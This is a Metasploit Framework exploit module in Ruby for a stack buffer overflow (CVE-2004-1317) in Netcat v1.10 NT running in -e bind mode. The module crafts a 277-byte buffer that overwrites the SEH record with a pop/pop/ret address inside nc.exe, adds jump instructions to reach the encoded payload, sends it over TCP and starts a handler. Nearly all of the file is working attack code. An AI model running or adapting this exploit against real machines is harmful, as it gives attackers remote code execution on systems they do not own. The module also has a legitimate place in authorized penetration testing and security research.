##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'Netcat v1.10 NT Stack Buffer Overflow',
			'Description'	=> %q{
					This module exploits a stack buffer overflow in Netcat v1.10 NT. By sending
					an overly long string we are able to overwrite SEH. The vulnerability
					exists when netcat is used to bind (-e) an executable to a port in doexec.c.
					This module tested successfully using "c:\>nc -L -p 31337 -e ftp".
				},
			'Author'       => 'patrick',
			'Arch'			=> [ ARCH_X86 ],
			'License'		=> MSF_LICENSE,
			'References'	=>
				[
					[ 'CVE', '2004-1317' ],
					[ 'OSVDB', '12612' ],
					[ 'BID', '12106' ],
					[ 'EDB', '726' ]
				],
			'Privileged'		=> false,
			'DefaultOptions'	=>
				{
					'EXITFUNC'	=> 'thread',
				},
			'Payload'		=>
				{
					'Space'				=> 236,
					'BadChars'			=> "\x00\x0a\x0d",
					'StackAdjustment'	=> -3500,
				},
			'Platform' => ['win'],
			'Targets'  =>
				[
					# Patrick - Tested OK 2007/09/26 w2ksp0, w2ksp4, xpsp2 en.
					[ 'Universal nc.exe', { 'Ret' => 0x0040a6ce } ], # p/p/r nc.exe
				],
			'DisclosureDate' => 'Dec 27 2004',
			'DefaultTarget' => 0))
	end

	def autofilter
		false
	end

	def exploit
		connect

		sploit = rand_text(277, payload_badchars)
		sploit[0, payload.encoded.length] = payload.encoded
		sploit[236, 2] = Rex::Arch::X86.jmp_short(6)
		sploit[240, 4] = [target['Ret']].pack('V')
		sploit[244, 5] = Rex::Arch::X86.jmp(0xffffff08)

		sock.put(sploit)

		handler
		disconnect
	end
end
